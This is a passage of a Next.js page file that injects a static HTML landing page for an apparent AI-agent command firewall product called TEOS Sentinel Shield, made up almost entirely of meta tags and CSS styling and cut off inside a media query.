// app/page.tsx
// TEOS Sentinel Shield — Full Landing Page
// Auto-generated — do not hand-edit, regenerate from source HTML
// Last updated: 2026-05-04 21:34

export default function Page() {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TEOS Sentinel Shield — AI Execution Firewall</title>
<meta name="description" content="Pre-execution security guardrails for autonomous AI agents. Block unsafe commands before they run. Telegram-first, 5 free scans, zero signup.">
<meta name="keywords" content="AI agent security, pre-execution firewall, MENA AI sovereignty, autonomous systems, DevSecOps, Telegram bot security">
<meta property="og:title" content="TEOS Sentinel Shield — AI Execution Firewall">
<meta property="og:description" content="Block unsafe AI commands before execution. 25 named rules. 37 tests passing. Engine v2 stable.">
<meta property="og:image" content="https://teos-sentinel-shield.vercel.app/og.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;700&family=Fraunces:ital,wght@0,400;0,700;0,900;1,400;1,700&display=swap" rel="stylesheet">
<style>
:root {
  --black:        #060607;
  --deep:         #0b0b0d;
  --surface:      #101012;
  --surface2:     #141416;
  --border:       #1c1c1f;
  --border2:      #252528;
  --border3:      #2e2e32;
  --gold:         #c9a84c;
  --gold-dim:     #7a6030;
  --gold-bright:  #e8c46a;
  --gold-muted:   rgba(201,168,76,0.12);
  --red:          #b03030;
  --red-bright:   #e05050;
  --green:        #1a5c35;
  --green-bright: #2ecc71;
  --amber:        #b55a10;
  --amber-bright: #e8842a;
  --text:         #eae6dc;
  --text-dim:     #7a7468;
  --text-muted:   #3e3c38;
  --scan-green:   #00d084;
  --video-accent: rgba(201,168,76,0.15);
}

*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
html { scroll-behavior: smooth; font-size: 16px; }

body {
  background: var(--black);
  color: var(--text);
  font-family: 'Syne', sans-serif;
  line-height: 1.6;
  overflow-x: hidden;
}

/* ── GRID BG ── */
body::before {
  content: '';
  position: fixed; inset: 0;
  background-image:
    linear-gradient(rgba(201,168,76,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(201,168,76,0.025) 1px, transparent 1px);
  background-size: 80px 80px;
  pointer-events: none;
  z-index: 0;
}

/* ── NAV ── */
nav {
  position: fixed; top: 0; left: 0; right: 0; z-index: 200;
  display: flex; align-items: center; justify-content: space-between;
  padding: 18px 64px;
  border-bottom: 1px solid var(--border);
  background: rgba(6,6,7,0.94);
  backdrop-filter: blur(24px);
}

.nav-brand {
  display: flex; align-items: center; gap: 12px;
  text-decoration: none;
}

.brand-shield {
  width: 32px; height: 32px;
  background: linear-gradient(135deg, var(--gold) 0%, var(--gold-dim) 100%);
  clip-path: polygon(50% 0%, 100% 20%, 100% 70%, 50% 100%, 0% 70%, 0% 20%);
  display: flex; align-items: center; justify-content: center;
  position: relative;
}

.brand-shield::after {
  content: '';
  position: absolute; inset: 3px;
  background: var(--black);
  clip-path: polygon(50% 0%, 100% 20%, 100% 70%, 50% 100%, 0% 70%, 0% 20%);
}

.brand-shield::before {
  content: '⚡';
  font-size: 10px;
  position: relative; z-index: 1;
}

.brand-name {
  font-weight: 800; font-size: 14px;
  letter-spacing: 0.08em;
  color: var(--gold);
  text-transform: uppercase;
}

.nav-links {
  display: flex; align-items: center; gap: 36px; list-style: none;
}

.nav-links a {
  color: var(--text-dim); text-decoration: none;
  font-size: 12px; letter-spacing: 0.08em; text-transform: uppercase;
  font-family: 'JetBrains Mono', monospace;
  transition: color 0.2s;
}

.nav-links a:hover { color: var(--text); }

.nav-cta {
  background: var(--gold) !important;
  color: var(--black) !important;
  padding: 8px 22px !important;
  font-weight: 700 !important;
  font-family: 'Syne', sans-serif !important;
  letter-spacing: 0.04em !important;
  border-radius: 2px;
  transition: background 0.2s !important;
}

.nav-cta:hover { background: var(--gold-bright) !important; }

/* ── STATUS BAR ── */
.status-bar {
  position: fixed; top: 69px; left: 0; right: 0; z-index: 199;
  background: rgba(0,208,132,0.06);
  border-bottom: 1px solid rgba(0,208,132,0.12);
  display: flex; align-items: center; justify-content: center;
  gap: 32px; padding: 8px 24px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; letter-spacing: 0.08em;
  color: var(--text-dim);
}

.status-item { display: flex; align-items: center; gap: 6px; }

.status-dot {
  width: 5px; height: 5px; border-radius: 50%;
  background: var(--scan-green);
  animation: blink 2s ease-in-out infinite;
}

@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }

/* ── HERO ── */
.hero {
  position: relative; min-height: 100vh;
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  padding: 180px 64px 120px;
  text-align: center; overflow: hidden;
}

.hero-glow {
  position: absolute; top: 10%; left: 50%; transform: translateX(-50%);
  width: 900px; height: 700px;
  background: radial-gradient(ellipse, rgba(201,168,76,0.06) 0%, transparent 65%);
  pointer-events: none;
}

.hero-glow2 {
  position: absolute; bottom: -20%; left: 30%;
  width: 400px; height: 400px;
  background: radial-gradient(ellipse, rgba(0,208,132,0.04) 0%, transparent 70%);
  pointer-events: none;
}

.engine-badge {
  display: inline-flex; align-items: center; gap: 10px;
  border: 1px solid var(--border3);
  background: rgba(201,168,76,0.04);
  padding: 7px 18px; border-radius: 2px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--gold);
  letter-spacing: 0.14em; text-transform: uppercase;
  margin-bottom: 48px;
  animation: fadeUp 0.6s ease both;
}

.badge-pulse {
  width: 7px; height: 7px; border-radius: 50%;
  background: var(--scan-green);
  box-shadow: 0 0 8px var(--scan-green);
  animation: blink 2s infinite;
}

.hero h1 {
  font-family: 'Fraunces', serif;
  font-weight: 900;
  font-size: clamp(44px, 7vw, 96px);
  line-height: 1.0; letter-spacing: -0.03em;
  max-width: 980px; margin-bottom: 32px;
  animation: fadeUp 0.7s ease 0.08s both;
}

.hero h1 em { font-style: italic; color: var(--gold); }

.hero h1 .line-strike {
  position: relative; color: var(--text-dim); font-style: italic;
}

.hero h1 .line-strike::after {
  content: '';
  position: absolute; left: 0; right: 0; top: 50%;
  height: 3px; background: var(--red-bright);
  transform: rotate(-1.5deg);
}

.hero-sub {
  font-family: 'JetBrains Mono', monospace;
  font-size: 15px; color: var(--text-dim);
  max-width: 600px; line-height: 1.8;
  margin-bottom: 52px;
  animation: fadeUp 0.7s ease 0.16s both;
}

.hero-sub strong { color: var(--text); }

.hero-ctas {
  display: flex; align-items: center; gap: 16px;
  flex-wrap: wrap; justify-content: center;
  animation: fadeUp 0.7s ease 0.24s both;
  margin-bottom: 16px;
}

.btn-primary {
  display: inline-flex; align-items: center; gap: 10px;
  background: var(--gold); color: var(--black);
  text-decoration: none;
  font-weight: 800; font-size: 15px;
  letter-spacing: 0.04em;
  padding: 16px 40px; border-radius: 2px;
  transition: all 0.2s; position: relative; overflow: hidden;
}

.btn-primary::after {
  content: ''; position: absolute; inset: 0;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
  transform: translateX(-100%); transition: transform 0.5s;
}

.btn-primary:hover::after { transform: translateX(100%); }
.btn-primary:hover { background: var(--gold-bright); transform: translateY(-2px); box-shadow: 0 12px 40px rgba(201,168,76,0.25); }

.btn-secondary {
  display: inline-flex; align-items: center; gap: 10px;
  border: 1px solid var(--border3);
  color: var(--text-dim); text-decoration: none;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; letter-spacing: 0.06em;
  padding: 16px 28px; border-radius: 2px;
  transition: all 0.2s;
}

.btn-secondary:hover { border-color: var(--gold-dim); color: var(--text); }

.micro {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--text-muted);
  letter-spacing: 0.06em;
  animation: fadeUp 0.7s ease 0.32s both;
}

.trust-bar {
  display: flex; align-items: center; gap: 48px;
  margin-top: 80px; padding-top: 48px;
  border-top: 1px solid var(--border);
  animation: fadeUp 0.7s ease 0.4s both;
  flex-wrap: wrap; justify-content: center;
}

.trust-item {
  display: flex; align-items: center; gap: 10px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); letter-spacing: 0.05em;
}

.trust-item .num {
  font-size: 22px; font-weight: 800;
  color: var(--gold); font-family: 'Syne', sans-serif;
  letter-spacing: -0.01em;
}

/* ── THREAT TICKER ── */
.threat-ticker {
  background: rgba(224,80,80,0.04);
  border-top: 1px solid rgba(224,80,80,0.1);
  border-bottom: 1px solid rgba(224,80,80,0.1);
  padding: 18px 0; overflow: hidden;
}

.ticker-inner {
  display: flex; gap: 80px;
  animation: ticker 30s linear infinite;
  white-space: nowrap;
}

.ticker-inner:hover { animation-play-state: paused; }

@keyframes ticker {
  from { transform: translateX(0); }
  to { transform: translateX(-50%); }
}

.tick-item {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-muted);
  display: flex; align-items: center; gap: 12px;
  letter-spacing: 0.05em;
}

.tick-blocked { color: var(--red-bright); font-weight: 700; }
.tick-label { color: var(--text-muted); }

/* ── DEMO VIDEO SECTION ── */
.video-section {
  padding: 100px 64px;
  max-width: 1280px; margin: 0 auto;
  position: relative;
}

.label {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; letter-spacing: 0.2em;
  text-transform: uppercase; color: var(--gold);
  margin-bottom: 20px;
}

.section-title {
  font-family: 'Fraunces', serif;
  font-weight: 900;
  font-size: clamp(28px, 4vw, 54px);
  letter-spacing: -0.03em;
  margin-bottom: 16px; line-height: 1.05;
}

.section-sub {
  color: var(--text-dim);
  max-width: 540px; line-height: 1.7;
  margin-bottom: 48px;
  font-family: 'JetBrains Mono', monospace; font-size: 14px;
}

/* ── VIDEO WRAPPER ── */
.video-wrapper {
  position: relative;
  width: 100%;
  border-radius: 4px;
  overflow: hidden;
  border: 1px solid var(--gold-dim);
  background: var(--surface);
  box-shadow: 0 0 80px rgba(201,168,76,0.08), 0 0 0 1px var(--border);
}

/* When video is present: */
.video-wrapper video {
  width: 100%;
  display: block;
  border-radius: 3px;
}

/* ── VIDEO PLACEHOLDER (remove when you add the real video) ── */
.video-placeholder {
  aspect-ratio: 16 / 9;
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  background: radial-gradient(ellipse at center, rgba(201,168,76,0.06) 0%, var(--deep) 70%);
  cursor: default;
  position: relative;
  overflow: hidden;
}

.video-placeholder::before {
  content: '';
  position: absolute; inset: 0;
  background-image:
    linear-gradient(rgba(201,168,76,0.04) 1px, transparent 1px),
    linear-gradient(90deg, rgba(201,168,76,0.04) 1px, transparent 1px);
  background-size: 40px 40px;
}

.video-corner {
  position: absolute;
  width: 24px; height: 24px;
  border-color: var(--gold-dim); border-style: solid;
  opacity: 0.6;
}
.video-corner.tl { top: 16px; left: 16px; border-width: 2px 0 0 2px; }
.video-corner.tr { top: 16px; right: 16px; border-width: 2px 2px 0 0; }
.video-corner.bl { bottom: 16px; left: 16px; border-width: 0 0 2px 2px; }
.video-corner.br { bottom: 16px; right: 16px; border-width: 0 2px 2px 0; }

.play-ring {
  width: 80px; height: 80px; border-radius: 50%;
  border: 1px solid var(--gold-dim);
  display: flex; align-items: center; justify-content: center;
  position: relative; z-index: 1;
  margin-bottom: 24px;
  background: rgba(201,168,76,0.06);
  animation: pulse-ring 3s ease-in-out infinite;
}

.play-ring::before {
  content: '';
  position: absolute; inset: -8px;
  border-radius: 50%;
  border: 1px solid rgba(201,168,76,0.15);
  animation: pulse-ring 3s ease-in-out infinite 0.5s;
}

@keyframes pulse-ring {
  0%, 100% { opacity: 1; transform: scale(1); }
  50% { opacity: 0.6; transform: scale(1.05); }
}

.play-icon {
  width: 0; height: 0;
  border-top: 14px solid transparent;
  border-bottom: 14px solid transparent;
  border-left: 22px solid var(--gold);
  margin-left: 4px;
  position: relative; z-index: 1;
}

.placeholder-text {
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px; color: var(--text-dim);
  letter-spacing: 0.06em; text-align: center;
  position: relative; z-index: 1;
  margin-bottom: 8px;
}

.placeholder-sub {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--text-muted);
  letter-spacing: 0.06em; text-align: center;
  position: relative; z-index: 1;
}

/* ── VIDEO COMING SOON BADGE ── */
.video-badge {
  position: absolute; top: 16px; left: 16px; z-index: 10;
  display: inline-flex; align-items: center; gap: 8px;
  background: rgba(201,168,76,0.12);
  border: 1px solid var(--gold-dim);
  padding: 6px 12px; border-radius: 2px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: var(--gold);
  letter-spacing: 0.1em; text-transform: uppercase;
}

/* ── VIDEO TABS: choose format ── */
.video-tabs {
  display: flex; gap: 8px; margin-bottom: 24px; flex-wrap: wrap;
}

.vtab {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; letter-spacing: 0.06em;
  padding: 6px 14px; border-radius: 2px;
  border: 1px solid var(--border3);
  color: var(--text-muted); cursor: pointer;
  transition: all 0.2s; background: transparent;
}

.vtab.active {
  border-color: var(--gold-dim);
  color: var(--gold);
  background: rgba(201,168,76,0.06);
}

/* ── TIMELINE strip under video ── */
.video-timeline {
  display: flex; align-items: stretch;
  border-top: 1px solid var(--border);
  background: var(--deep);
}

.vt-step {
  flex: 1; padding: 16px 20px;
  border-right: 1px solid var(--border);
  transition: background 0.2s;
}

.vt-step:last-child { border-right: none; }
.vt-step:hover { background: var(--surface); }

.vt-time {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: var(--gold-dim);
  letter-spacing: 0.1em; margin-bottom: 4px;
}

.vt-label {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim);
}

/* ── HOW-TO RECORD BOX ── */
.record-hint {
  margin-top: 28px;
  border: 1px dashed var(--border3);
  border-radius: 4px; padding: 20px 24px;
  background: rgba(201,168,76,0.02);
}

.rh-title {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--gold-dim);
  letter-spacing: 0.1em; text-transform: uppercase;
  margin-bottom: 10px;
}

.rh-step {
  display: flex; gap: 12px; padding: 5px 0;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); line-height: 1.5;
}

.rh-num {
  color: var(--gold-dim); font-weight: 700;
  flex-shrink: 0; width: 18px;
}

code {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; background: var(--surface2);
  border: 1px solid var(--border2);
  padding: 1px 6px; border-radius: 3px;
  color: var(--gold-bright);
}

/* ── LIVE TERMINAL ── */
.terminal-section {
  padding: 120px 64px;
  max-width: 1280px; margin: 0 auto;
}

.terminals {
  display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px;
}

.term {
  background: var(--surface);
  border: 1px solid var(--border); border-radius: 4px; overflow: hidden;
  transition: all 0.25s;
}

.term:hover { border-color: var(--border3); transform: translateY(-3px); }

.term-bar {
  display: flex; align-items: center; gap: 7px;
  padding: 11px 14px; border-bottom: 1px solid var(--border);
  background: rgba(255,255,255,0.018);
}

.td { width: 10px; height: 10px; border-radius: 50%; }
.td-r { background: #c0392b; }
.td-y { background: #d4a017; }
.td-g { background: #27ae60; }

.term-name {
  margin-left: auto;
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: var(--text-muted); letter-spacing: 0.07em;
}

.term-body {
  padding: 20px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; line-height: 2;
}

.tp { color: var(--gold); }
.tc { color: var(--text); }
.tmt { color: var(--text-muted); }
.tbl { color: var(--red-bright); font-weight: 700; }
.twn { color: var(--amber-bright); font-weight: 700; }
.tok { color: var(--scan-green); font-weight: 700; }
.tsc { color: var(--text-dim); font-size: 11px; }
.tr  { color: var(--text-dim); font-size: 11px; padding-left: 14px; }

.term-verdict {
  padding: 14px 20px; border-top: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px;
}

.verdict-pill {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; font-weight: 700;
  letter-spacing: 0.1em; padding: 4px 10px; border-radius: 2px;
}

.v-block { background: rgba(224,80,80,0.15); color: var(--red-bright); border: 1px solid rgba(224,80,80,0.3); }
.v-warn  { background: rgba(232,132,42,0.15); color: var(--amber-bright); border: 1px solid rgba(232,132,42,0.3); }
.v-allow { background: rgba(0,208,132,0.12); color: var(--scan-green); border: 1px solid rgba(0,208,132,0.25); }

.verdict-rule {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: var(--text-muted); letter-spacing: 0.05em;
}

/* ── ENGINE STATS ── */
.engine-stats {
  background: var(--deep);
  border-top: 1px solid var(--border);
  border-bottom: 1px solid var(--border);
  padding: 64px;
}

.engine-inner {
  max-width: 1280px; margin: 0 auto;
  display: grid; grid-template-columns: repeat(4, 1fr);
  background: var(--border); border: 1px solid var(--border);
}

.estat {
  background: var(--deep); padding: 48px 40px; text-align: center;
}

.estat + .estat { border-left: 1px solid var(--border); }

.estat-num {
  font-family: 'Fraunces', serif; font-weight: 900;
  font-size: 60px; color: var(--gold); letter-spacing: -0.03em;
  line-height: 1; margin-bottom: 10px;
}

.estat-label {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--text-muted);
  letter-spacing: 0.1em; text-transform: uppercase;
}

.estat-sub {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; color: var(--text-muted); margin-top: 4px; letter-spacing: 0.06em;
}

/* ── HOW IT WORKS ── */
.flow-section { padding: 120px 64px; max-width: 1280px; margin: 0 auto; }

.flow-steps {
  display: grid; grid-template-columns: repeat(4, 1fr);
  gap: 0; position: relative; margin-top: 64px;
}

.flow-steps::before {
  content: '';
  position: absolute; top: 28px; left: 14%; right: 14%;
  height: 1px;
  background: linear-gradient(90deg, transparent, var(--gold-dim), transparent);
  opacity: 0.5;
}

.flow-step { padding: 0 28px; }

.step-n {
  width: 56px; height: 56px;
  border: 1px solid var(--gold-dim); border-radius: 2px;
  display: flex; align-items: center; justify-content: center;
  font-family: 'Fraunces', serif; font-weight: 900;
  font-size: 24px; color: var(--gold);
  margin-bottom: 28px; background: var(--black);
  position: relative; z-index: 1; transition: all 0.2s;
}

.flow-step:hover .step-n { background: var(--gold-muted); border-color: var(--gold); }

.step-ti { font-weight: 700; font-size: 16px; margin-bottom: 10px; letter-spacing: 0.01em; }

.step-desc {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); line-height: 1.7;
}

/* ── FEATURES ── */
.features-section {
  padding: 120px 64px;
  background: var(--deep);
  border-top: 1px solid var(--border);
  border-bottom: 1px solid var(--border);
}

.features-inner { max-width: 1280px; margin: 0 auto; }

.features-grid {
  display: grid; grid-template-columns: repeat(3, 1fr);
  gap: 1px; background: var(--border);
  border: 1px solid var(--border); margin-top: 64px;
}

.feat { background: var(--deep); padding: 44px; transition: background 0.2s; }
.feat:hover { background: var(--surface); }

.feat-icon {
  width: 52px; height: 52px; border: 1px solid var(--border2); border-radius: 2px;
  display: flex; align-items: center; justify-content: center;
  font-size: 24px; margin-bottom: 24px;
  background: rgba(201,168,76,0.04);
}

.feat-cmd {
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px; color: var(--gold);
  letter-spacing: 0.07em; margin-bottom: 12px;
}

.feat-title { font-weight: 800; font-size: 20px; margin-bottom: 12px; letter-spacing: -0.01em; }

.feat-desc {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); line-height: 1.8;
}

.feat-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 20px; }

.ftag {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px; letter-spacing: 0.07em; padding: 3px 10px;
  border: 1px solid var(--border2); color: var(--text-muted); border-radius: 2px;
}

/* ── COMPARE ── */
.compare-section { padding: 120px 64px; max-width: 1280px; margin: 0 auto; }

.compare-table { width: 100%; border-collapse: collapse; margin-top: 64px; }

.compare-table th {
  padding: 16px 24px; text-align: left;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; font-weight: 700;
  letter-spacing: 0.06em; text-transform: uppercase;
  border-bottom: 1px solid var(--border2); color: var(--text-dim);
}

.compare-table th.tc { color: var(--gold); background: rgba(201,168,76,0.04); }

.compare-table td {
  padding: 16px 24px; font-size: 13px;
  border-bottom: 1px solid var(--border); color: var(--text-dim);
  font-family: 'JetBrains Mono', monospace;
}

.compare-table td.tc { background: rgba(201,168,76,0.025); }
.compare-table tr:hover td { background: rgba(255,255,255,0.015); }
.compare-table tr:hover td.tc { background: rgba(201,168,76,0.05); }

.cy { color: var(--scan-green); }
.cn { color: var(--text-muted); }
.cp { color: var(--amber-bright); }

/* ── PRICING ── */
.pricing-section {
  padding: 120px 64px;
  background: var(--deep); border-top: 1px solid var(--border);
}

.pricing-inner { max-width: 1280px; margin: 0 auto; }

.pricing-grid {
  display: grid; grid-template-columns: repeat(3, 1fr);
  gap: 20px; margin-top: 64px;
}

.plan {
  background: var(--surface); border: 1px solid var(--border); border-radius: 4px;
  padding: 44px; position: relative; transition: all 0.2s;
}

.plan:hover { border-color: var(--border3); transform: translateY(-3px); }
.plan.pop { border-color: var(--gold-dim); background: rgba(201,168,76,0.025); }
.plan.pop:hover { border-color: var(--gold); }

.pop-badge {
  position: absolute; top: -12px; left: 50%; transform: translateX(-50%);
  background: var(--gold); color: var(--black);
  font-family: 'Syne', sans-serif;
  font-size: 10px; font-weight: 800;
  letter-spacing: 0.12em; padding: 4px 14px; border-radius: 2px; white-space: nowrap;
}

.plan-name { font-weight: 800; font-size: 20px; letter-spacing: 0.01em; margin-bottom: 8px; }

.plan-price { display: flex; align-items: baseline; gap: 4px; margin-bottom: 6px; }

.price-n {
  font-family: 'Fraunces', serif; font-weight: 900;
  font-size: 52px; color: var(--text); letter-spacing: -0.03em;
}

.price-p { font-size: 14px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }

.plan-tag {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); margin-bottom: 28px;
  padding-bottom: 28px; border-bottom: 1px solid var(--border);
}

.plan-feats { list-style: none; margin-bottom: 32px; }

.plan-feats li {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); padding: 8px 0;
  display: flex; align-items: center; gap: 10px;
}

.plan-feats li::before { content: '→'; color: var(--gold-dim); font-size: 12px; flex-shrink: 0; }

.btn-plan {
  display: block; text-align: center;
  padding: 13px 24px; border-radius: 2px;
  font-weight: 800; font-size: 14px;
  letter-spacing: 0.04em; text-decoration: none; transition: all 0.2s;
}

.btn-gold { background: var(--gold); color: var(--black); }
.btn-gold:hover { background: var(--gold-bright); }
.btn-out { border: 1px solid var(--border2); color: var(--text-dim); }
.btn-out:hover { border-color: var(--gold-dim); color: var(--text); }

.enterprise-row {
  margin-top: 40px; border: 1px solid var(--border);
  border-left: 3px solid var(--gold-dim); padding: 28px 36px;
  display: flex; align-items: center; justify-content: space-between; gap: 24px;
}

.ent-h { font-weight: 800; font-size: 17px; margin-bottom: 6px; }

.ent-p {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px; color: var(--text-dim); line-height: 1.6;
}

.btn-ent {
  display: inline-flex; align-items: center; gap: 8px;
  border: 1px solid var(--gold-dim); color: var(--gold);
  text-decoration: none; padding: 11px 24px;
  font-weight: 700; font-size: 13px;
  letter-spacing: 0.04em; border-radius: 2px;
  white-space: nowrap; transition: all 0.2s;
}

.btn-ent:hover { background: rgba(201,168,76,0.08); border-color: var(--gold); }

/* ── SOVEREIGN ── */
.sovereign-section {
  padding: 120px 64px; max-width: 1280px; margin: 0 auto;
  display: grid; grid-template-columns: 1fr 1fr; gap: 80px; align-items: center;
}

.sovereign-copy h2 {
  font-family: 'Fraunces', serif; font-weight: 900;
  font-size: clamp(28px, 3.5vw, 50px); letter-spacing: -0.03em;
  line-height: 1.05; margin-bottom: 24px;
}

.sovereign-copy h2 em { font-style: italic; color: var(--gold); }

.sovereign-copy p {
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px; color: var(--text-dim); line-height: 1.8; margin-bottom: 20px;
}

.sovereign-pills { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 32px; }

.spill {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; letter-spacing: 0.07em; padding: 5px 14px;
  border: 1px solid var(--border3); color: var(--text-dim); border-radius: 2px;
  transition: all 0.2s;
}

.spill:hover { border-color: var(--gold-dim); color: var(--gold); }

.sovereign-metrics { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }

.smet {
  background: var(--surface); border: 1px solid var(--border);
  padding: 28px; border-radius: 2px; transition: all 0.2s;
}

.smet:hover { border-color: var(--border3); }
.smet-n { font-family: 'Fraunces', serif; font-weight: 900; font-size: 36px; color: var(--gold); letter-spacing: -0.02em; margin-bottom: 6px; }
.smet-l { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-muted); letter-spacing: 0.08em; text-transform: uppercase; }

/* ── ROADMAP ── */
.roadmap-section { padding: 120px 64px; background: var(--deep); border-top: 1px solid var(--border); }
.roadmap-inner { max-width: 1280px; margin: 0 auto; }
.roadmap-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-top: 64px; }

.rm-card {
  border: 1px solid var(--border); padding: 28px; border-radius: 2px;
  position: relative; overflow: hidden; transition: all 0.2s;
}

.rm-card:hover { border-color: var(--border3); transform: translateY(-2px); }

.rm-card.live { border-color: rgba(0,208,132,0.25); background: rgba(0,208,132,0.03); }

.rm-card.live::before {
  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
  background: linear-gradient(90deg, var(--scan-green), transparent);
}

.rm-q { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-muted); margin-bottom: 14px; }
.rm-q.live-q { color: var(--scan-green); }
.rm-dot { display: inline-block; width: 7px; height: 7px; border-radius: 50%; background: var(--scan-green); margin-right: 6px; animation: blink 2s infinite; }
.rm-title { font-weight: 800; font-size: 15px; margin-bottom: 10px; letter-spacing: -0.01em; }
.rm-desc { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.7; }

/* ── FINAL CTA ── */
.final-cta { padding: 160px 64px; text-align: center; position: relative; overflow: hidden; }

.final-cta::before {
  content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
  width: 800px; height: 600px;
  background: radial-gradient(ellipse, rgba(201,168,76,0.07) 0%, transparent 65%);
  pointer-events: none;
}

.final-cta h2 {
  font-family: 'Fraunces', serif; font-weight: 900;
  font-size: clamp(36px, 5vw, 72px); letter-spacing: -0.03em;
  line-height: 1.05; margin-bottom: 24px; position: relative;
}

.final-cta h2 em { font-style: italic; color: var(--gold); }

.final-cta p {
  font-family: 'JetBrains Mono', monospace;
  font-size: 14px; color: var(--text-dim);
  max-width: 500px; margin: 0 auto 48px; line-height: 1.8; position: relative;
}

.final-btns { display: flex; justify-content: center; gap: 16px; flex-wrap: wrap; position: relative; }

/* ── FOOTER ── */
footer { border-top: 1px solid var(--border); background: var(--deep); }

.footer-inner {
  max-width: 1280px; margin: 0 auto; padding: 72px 64px 48px;
  display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 48px;
}

.foot-brand-name { font-weight: 800; font-size: 15px; letter-spacing: 0.06em; color: var(--gold); margin-bottom: 16px; }

.foot-brand-desc { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); line-height: 1.8; margin-bottom: 20px; }

.foot-contact { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--gold-dim); text-decoration: none; border-bottom: 1px solid var(--gold-dim); padding-bottom: 1px; transition: color 0.2s; }
.foot-contact:hover { color: var(--gold); }

.foot-col h5 { font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-muted); margin-bottom: 20px; }
.foot-col ul { list-style: none; }
.foot-col li { margin-bottom: 12px; }
.foot-col a { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
.foot-col a:hover { color: var(--text); }

.footer-bottom {
  max-width: 1280px; margin: 0 auto; padding: 24px 64px;
  border-top: 1px solid var(--border);
  display: flex; align-items: center; justify-content: space-between;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px; color: var(--text-muted); letter-spacing: 0.05em;
  flex-wrap: wrap; gap: 12px;
}

/* ── REVEAL ── */
.reveal { opacity: 0; transform: translateY(24px); transition: opacity 0.7s ease, transform 0.7s ease; }
.reveal.visible { opacity: 1; transform: translateY(0); }

@keyframes fadeUp {
  from { opacity: 0; transform: translateY(20px); }
  to   { opacity: 1; transform: translateY(0); }
}

::-webkit-scrollbar { width: 4px; }
::-webkit-scrollbar-track { background: var(--black); }
::-webkit-scrollbar-thumb { background: var(--border3); border-radius: 2px; }

/* ── RESPONSIVE ── */
@media (max-width: 1024px) {
  nav { padding: 16px 32px; }
  .nav-links { gap: 24px; }
  .hero, .terminal-section, .flow-section, .features-section,
  .compare-section, .pricing-section, .roadmap-section,
  .sovereign-section, .final-cta, .video-section { padding-left: 32px; padding-right: 32px; }
  .terminals { grid-template-columns: 1fr; }
  .flow-steps { grid-template-columns: 1fr 1fr; gap: 48px; }
  .flow-steps::before { display: none; }
  .features-grid { grid-template-columns: 1fr 1fr; }
  .pricing-grid { grid-template-columns: 1fr; }
  .sovereign-section { grid-template-columns: 1fr; gap: 48px; }
  .roadmap-grid { grid-template-columns: 1fr 1fr; }
  .engine-inner { grid-template-columns: 1fr 1fr; }
  .footer-inner { grid-template-columns: 1fr 1fr; }
  .enterprise-row { flex-direction: column; align-items: flex-start; }
}

@media (max-width: 640px) {
